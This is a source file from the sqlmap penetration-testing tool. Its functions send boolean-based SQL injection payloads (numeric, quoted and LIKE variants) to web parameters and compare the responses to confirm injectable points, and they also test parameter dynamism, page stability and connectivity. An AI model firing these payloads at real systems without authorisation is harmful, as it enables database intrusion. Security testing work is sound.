#!/usr/bin/env python

"""
$Id: checks.py 357 2008-09-21 18:52:16Z inquisb $

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """

    logMsg  = "testing unescaped numeric injection "
    logMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(logMsg)

    randInt = randomInt()
    randStr = randomStr()

    payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == kb.defaultResult:
        payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != kb.defaultResult:
            logMsg  = "confirming unescaped numeric injection "
            logMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(logMsg)

            payload = agent.payload(place, parameter, value, "%s%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != kb.defaultResult:
                logMsg  = "%s parameter '%s' is " % (place, parameter)
                logMsg += "unescaped numeric injectable "
                logMsg += "with %d parenthesis" % parenthesis
                logger.info(logMsg)

                return "numeric"

    logMsg  = "%s parameter '%s' is not " % (place, parameter)
    logMsg += "unescaped numeric injectable"
    logger.info(logMsg)

    logMsg  = "testing single quoted string injection "
    logMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(logMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == kb.defaultResult:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + 'A'))
        falseResult = Request.queryPage(payload, place)

        if falseResult != kb.defaultResult:
            logMsg  = "confirming single quoted string injection "
            logMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(logMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != kb.defaultResult:
                logMsg  = "%s parameter '%s' is " % (place, parameter)
                logMsg += "single quoted string injectable "
                logMsg += "with %d parenthesis" % parenthesis
                logger.info(logMsg)

                return "stringsingle"

    logMsg  = "%s parameter '%s' is not " % (place, parameter)
    logMsg += "single quoted string injectable"
    logger.info(logMsg)

    logMsg  = "testing LIKE single quoted string injection "
    logMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(logMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == kb.defaultResult:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + 'A'))
        falseResult = Request.queryPage(payload, place)

        if falseResult != kb.defaultResult:
            logMsg  = "confirming LIKE single quoted string injection "
            logMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(logMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != kb.defaultResult:
                logMsg  = "%s parameter '%s' is " % (place, parameter)
                logMsg += "LIKE single quoted string injectable "
                logMsg += "with %d parenthesis" % parenthesis
                logger.info(logMsg)

                return "likesingle"

    logMsg  = "%s parameter '%s' is not " % (place, parameter)
    logMsg += "LIKE single quoted string injectable"
    logger.info(logMsg)

    logMsg  = "testing double quoted string injection "
    logMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(logMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == kb.defaultResult:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + 'A'))
        falseResult = Request.queryPage(payload, place)

        if falseResult != kb.defaultResult:
            logMsg  = "confirming double quoted string injection "
            logMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(logMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != kb.defaultResult:
                logMsg  = "%s parameter '%s' is " % (place, parameter)
                logMsg += "double quoted string injectable "
                logMsg += "with %d parenthesis" % parenthesis
                logger.info(logMsg)

                return "stringdouble"

    logMsg  = "%s parameter '%s' is not " % (place, parameter)
    logMsg += "double quoted string injectable"
    logger.info(logMsg)

    logMsg  = "testing LIKE double quoted string injection "
    logMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(logMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == kb.defaultResult:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + 'A'))
        falseResult = Request.queryPage(payload, place)

        if falseResult != kb.defaultResult:
            logMsg  = "confirming LIKE double quoted string injection "
            logMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(logMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != kb.defaultResult:
                logMsg  = "%s parameter '%s' is " % (place, parameter)
                logMsg += "LIKE double quoted string injectable "
                logMsg += "with %d parenthesis" % parenthesis
                logger.info(logMsg)

                return "likedouble"

    logMsg  = "%s parameter '%s' is not " % (place, parameter)
    logMsg += "LIKE double quoted string injectable"
    logger.info(logMsg)

    return None


def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    logMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(logMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if kb.defaultResult == dynResult1:
        return False

    logMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(logMsg)

    payload = agent.payload(place, parameter, value, "'%s" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, "\"%s" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = kb.defaultResult != dynResult2
    condition |= kb.defaultResult != dynResult3

    return condition


def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    logMsg = "testing if the url is stable, wait a few seconds"
    logger.info(logMsg)

    firstResult = Request.queryPage()
    time.sleep(0.5)

    secondResult = Request.queryPage()
    time.sleep(0.5)

    thirdResult = Request.queryPage()

    condition  = firstResult == secondResult
    condition &= secondResult == thirdResult

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("String") and
                  kb.resumedQueries[conf.url]["String"][:-1] == conf.string
                )

    if condition:
        return True

    logMsg  = "testing if the provided string is within the "
    logMsg += "target URL page content"
    logger.info(logMsg)

    page = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = "you provided '%s' as the string to " % conf.string
        errMsg += "match, but such a string is not within the target "
        errMsg += "URL page content, please provide another string."
        logger.error(errMsg)

        return False


def checkConnection():
    logMsg = "testing connection to the target url"
    logger.info(logMsg)

    try:
        kb.defaultResult = Request.queryPage()
    except sqlmapConnectionException, exceptionMsg:
        if conf.googleDork:
            exceptionMsg += ", skipping to next url"
            logger.warn(exceptionMsg)
            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True
